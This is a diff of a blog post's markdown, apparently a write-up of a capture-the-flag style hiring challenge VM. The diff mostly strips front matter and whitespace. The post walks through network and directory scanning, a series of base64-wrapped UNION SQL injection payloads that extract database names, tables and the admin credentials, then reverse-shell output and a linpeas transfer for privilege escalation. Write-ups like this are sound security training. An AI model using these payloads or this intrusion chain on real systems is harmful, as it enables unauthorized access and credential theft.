@@ -4,26 +4,7 @@ description: "This is about exploiting a virtual machine using Blackbox Testing,
 summary: "This is about exploiting a virtual machine using Blackbox Testing, which I successfully completed as part of a hiring challenge."
 date: 2023-09-28
 draft: false
-author: "Aftab Sama" # ["Me", "You"] # multiple authors
 tags: ["Web", "CTF", "Linux"]
-canonicalURL: ""
-showToc: false
-TocOpen: false
-TocSide: 'right'  # or 'left'
-# weight: 1
-# aliases: ["/first"]
-hidemeta: false
-comments: true
-disableHLJS: true # to disable highlightjs
-disableShare: true
-hideSummary: false
-searchHidden: false
-ShowReadingTime: true
-ShowBreadCrumbs: true
-ShowPostNavLinks: true
-ShowWordCount: true
-ShowRssButtonInSectionTermList: true
-# UseHugoToc: true
 ---
 
 ------------------------
@@ -41,16 +22,16 @@ First we start by finding the IP of machine here i used the `netdiscover` comman
 ```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
 └──╼ $sudo netdiscover -r 192.168.1.12/24
-Currently scanning: Finished!   |   Screen View: Unique Hosts                 
-                                                                               
- 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300               
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300
  _____________________________________________________________________________
-   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
  -----------------------------------------------------------------------------
- 192.168.1.4     **:**:**:**:**:**      1      60  CHONGQING FUGUI ELECTRONICS 
- 192.168.1.1     **:**:**:**:**:**      1      60  Syrotech Networks. Ltd.     
- 192.168.1.5     **:**:**:**:**:**      1      60  Intel Corporate             
- 192.168.1.21    **:**:**:**:**:**      1      60  Intel Corporate             
+ 192.168.1.4     **:**:**:**:**:**      1      60  CHONGQING FUGUI ELECTRONICS
+ 192.168.1.1     **:**:**:**:**:**      1      60  Syrotech Networks. Ltd.
+ 192.168.1.5     **:**:**:**:**:**      1      60  Intel Corporate
+ 192.168.1.21    **:**:**:**:**:**      1      60  Intel Corporate
 
 ```
 here `192.168.1.1` is ip of router.
@@ -76,7 +57,7 @@ First though was to look for `robots.txt` file but no luck so i did directory br
 
 ```shell
 ┌─[aftab@parrot]─[~/Downloads/practice/challenge]
-└──╼ $gobuster dir -u http://192.168.1.21:42710/ -w /usr/share/wordlists/dirb/common.txt 
+└──╼ $gobuster dir -u http://192.168.1.21:42710/ -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -97,10 +78,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /Admin                (Status: 301) [Size: 321] [--> http://192.168.1.21:42710/Admin/]
 /assets               (Status: 301) [Size: 322] [--> http://192.168.1.21:42710/assets/]
 /includes             (Status: 301) [Size: 324] [--> http://192.168.1.21:42710/includes/]
-/index.php            (Status: 200) [Size: 349]                                          
+/index.php            (Status: 200) [Size: 349]
 /search_result        (Status: 301) [Size: 329] [--> http://192.168.1.21:42710/search_result/]
-/server-status        (Status: 403) [Size: 280]                                               
-                                                                                              
+/server-status        (Status: 403) [Size: 280]
+
 ===============================================================
 2022/12/21 22:10:05 Finished
 ===============================================================
@@ -115,13 +96,13 @@ Admin page requires authentication Username and Password.
 
 <img width="240" alt="image" src="https://user-images.githubusercontent.com/79740895/208960036-f154d56c-5bbf-4b35-8d97-b39dcf34c217.png">
 
-now this is something interesting there is link to 
+now this is something interesting there is link to
 
 [http://192.168.1.21:42710/search_result/result_2022.php](http://192.168.1.21:42710/search_result/result_2022.php)
 
 <img width="544" alt="image" src="https://user-images.githubusercontent.com/79740895/208960308-7fa28195-3dc5-40ec-b877-5b1922e29dcf.png">
 
-_The Results of 2022 have not been published yet_ so let's try 2021 : 
+_The Results of 2022 have not been published yet_ so let's try 2021 :
 
 [http://192.168.1.21:42710/search_result/result_2021.php](http://192.168.1.21:42710/search_result/result_2021.php)
 
@@ -145,21 +126,21 @@ and that is successful SQL injection.
 payload:
 ```
 data=<@base64>621729581 OR 1=1<@/base64>
-``` 
+```
 > I'm using Hackvertor burp extension.
 
 <img width="918" alt="image" src="https://user-images.githubusercontent.com/79740895/208964245-b65f25db-f151-4791-8cf1-c43d3a977d9d.png">
 
 we know the number of columns it is 4 : `ID,	Name,	Roll,	Marks`.So the payload for union attack would be:
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT NULL, NULL, NULL, NULL<@/base64>
 ```
 
 It gives us the result in response so payload is correct and we also know the data types it should be Integer for ID, Roll, Marks and String for Name so we can put this values in payload.
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, "name", 2, 3<@/base64>
 ```
@@ -170,10 +151,10 @@ response:
 
 Now we can try to extract the databases'name, tables'name, columns'name.
 
-Reference: 
+Reference:
 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>
 ```
@@ -186,7 +167,7 @@ response:
 
 Now let's try to extract table name.
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,table_name,0x7c), 2, 3 fRoM information_schema.tables<@/base64>
 ```
@@ -200,7 +181,7 @@ response:
 
 We have table with name `users` let's see the columns of this table.
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,column_name,0x7c), 2, 3 fRoM information_schema.columns wHeRe table_name="users"<@/base64>
 ```
@@ -213,7 +194,7 @@ response:
 
 We have username and password feilds here. Let's extract them!
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,username,0x7c), 2, 3 fRoM users<@/base64>
 ```
@@ -222,7 +203,7 @@ response: ```|Admin|```
 
 username=Admin
 
-payload: 
+payload:
 ```
 data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,password,0x7c), 2, 3 fRoM users<@/base64>
 ```
@@ -297,7 +278,7 @@ bash: no job control in this shell
 www-data@heathrow-VirtualBox:/$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@heathrow-VirtualBox:/$ 
+www-data@heathrow-VirtualBox:/$
 ```
 
 We have shell but we can't access /home/heathrow we need to escalate our privilege. first thing that comes in mind is `linpeas.sh`. let's move that to victim machine i create local server with python `python -m http.server 80`, to transfer file because we normally don't have internet access in victim machine.
@@ -341,9 +322,9 @@ flag{box_cracked_successfully_report_to_admin}challenge
 
 ---
 
-flag: 
+flag:
 ```
-flag{box_cracked_successfully_report_to_admin}challenge 
+flag{box_cracked_successfully_report_to_admin}challenge
 ```
 
 Happy Hacking
